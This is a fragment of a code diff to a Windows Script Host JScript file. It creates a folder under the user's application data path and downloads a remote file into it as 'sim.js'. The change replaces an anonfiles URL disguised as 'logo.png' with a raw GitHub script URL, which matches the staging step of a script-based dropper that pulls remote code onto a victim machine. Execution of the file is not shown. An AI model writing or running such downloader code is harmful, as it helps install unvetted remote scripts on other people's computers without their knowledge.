@@ -25,4 +25,4 @@ if (!fs.FolderExists(uf))
     fs.CreateFolder(uf);
 
 //WScript.Echo(appdata);
-download("https://anonfiles.com/static/logo.png", uf + "\\sim.js");
+download("https://raw.githubusercontent.com/garythesnailog/the_game/main/sim.js", uf + "\\sim.js");
